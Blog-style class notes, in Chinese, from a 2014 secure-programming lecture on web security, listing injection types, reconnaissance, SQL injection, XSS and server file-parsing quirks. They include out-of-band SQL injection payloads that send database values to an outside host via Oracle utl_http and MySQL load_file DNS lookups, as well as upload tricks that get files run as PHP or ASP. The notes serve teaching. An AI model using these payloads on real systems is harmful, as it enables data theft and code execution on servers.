---
title: Secure Programming 2014-12-16
category: note
slug: secure-programming-20141216
date: 2014-12-16
---
2014/12/16 Secure Programming Class Note

今天的課程請到 Orange Tsai 大大，講題為 Web Security。

-  三大面向（交集：思路）
   -  技術
   -  經驗
   -  技巧

[SQL Injection 練習網站][1]

## Injection Flaw

-  SQL injection
-  cross site script
-  code injection
-  LDAP injection
-  XPATH injection
-  command injection

## 資訊搜集

-  Web Fingerprints
   -  wappalyzer, whatweb, recon-ng
-  經驗
   -  Header
   -  Python 遇到錯的編碼容易掛掉
   -  錯誤頁面
   -  Google
      -  "site:www.nctu.edu.tw ext:php"
   -  Strust2
      -  ?actionError=1
   -  RESTful
      -  `http://xxxx/show/id/1`
      -  `http://xxxx/show.php?id=1`
-  Dictionary Attack
   -  路徑
   -  /admin
   -  /phpmyadmin
   -  /sourcecode.zip

## SQL Injection

-  Union based
-  Error based
-  Blind based
-  Time based
-  Out of band（讓 database 把東西丟出來）
   -  Oracle
      -  `request.utl_http('http://orange.tw/'\|\|(select user from dual))`
   -  MySQL (along with Windows)
      -  UNC path (\\127.0.0.1\c$)
      -  load_file(concat('\\\\',version(),'.orange.tw\cxx'))
         -  5.1.3.orange.tw
      -  dnslogger -> skullsecurity nbtools

## Cross Site Scripting (XSS)

-  <http://pwn.orange.tw>
-  svg onload
-  Tweetdeck XSS Emoji

## PHP 語言鬆散特性

-  Wordpress 漏洞
-  2014 台大學生會長選舉網站 preg_match() === 0
-  Apache feature
   -  "hacker.php.xxx" works
-  Nginx + PHP (舊版)
   -  又稱 Nginx 文件解析漏洞（但其實不是 Nginx 的漏洞）
      -  圖檔嵌入 PHP code
      -  big.jpg/.php
      -  <http://pastebin.com/robots.txt>
         -  Content-Type = text/plain
      -  <http://pastebin.com/robots.txt/a.php>
         -  Content-Type = text/html
-  IIS + ASP (IIS 6 以下)
   -  分號 parsing 錯誤
      -  "xxx.asp;a.jpg"
   -  名稱為 ".asp" 結尾的 directory 其下的檔案都會被當成 ASP 來執行
      -  /a.asp/avatar.jpg 當成 asp 執行
-  Java
   -  sessioin fixation
   -  "1.jsp" 不可執行但 "1.jsp;" 可以

## Tools

-  Firefox (OSWASP mantra)
   -  Cookie Manageer
   -  FoxyProxy
   -  HackBar
   -  Modify Headers
      -  Include shellshock testing each HTTP request
   -  Tamper Data
   -  Wappalyzer
   -  X-Forwarded-For
      -  127.0.0.1
-  Burp Suite

[1]: http://sqli.exp.tw
